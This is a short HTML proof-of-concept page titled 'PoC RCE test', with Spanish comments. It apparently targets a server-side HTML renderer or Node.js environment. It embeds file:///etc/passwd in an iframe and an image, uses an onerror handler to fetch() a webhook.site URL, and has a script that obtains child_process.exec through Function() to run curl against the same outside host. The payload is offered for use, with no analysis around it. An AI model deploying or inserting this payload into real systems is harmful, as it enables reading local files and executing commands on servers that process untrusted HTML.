<!DOCTYPE html>
<html>
<head>
  <title>PoC RCE test</title>
</head>
<body>
  <!-- Forzamos carga de archivo local en sistemas Unix -->
  <iframe src="file:///etc/passwd"></iframe>

  <!-- Si carga falla, dispara exfiltraciÃ³n -->
  <img src="file:///etc/passwd"
       onerror="fetch('https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?leaked=etc-passwd')" />

  <!-- Variante de prueba adicional (cmd en sandbox Node.js) -->
  <script>
    try {
      var exec = Function("return require('child_process').exec")();
      exec("curl https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?cmd=executed");
    } catch(e) {
      fetch("https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?error=" + encodeURIComponent(e.message));
    }
  </script>
</body>
</html>
